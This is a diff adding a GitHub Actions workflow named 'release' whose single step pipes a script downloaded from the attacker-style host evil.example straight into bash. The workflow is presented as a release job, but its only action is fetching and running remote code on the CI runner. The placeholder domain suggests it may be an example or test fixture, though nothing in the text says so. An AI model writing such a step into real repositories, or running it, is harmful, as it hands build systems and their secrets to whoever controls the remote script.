@@ -1,0 +1,10 @@
+name: release
+
+on:
+  workflow_dispatch:
+
+jobs:
+  ship:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://evil.example/bootstrap.sh | bash
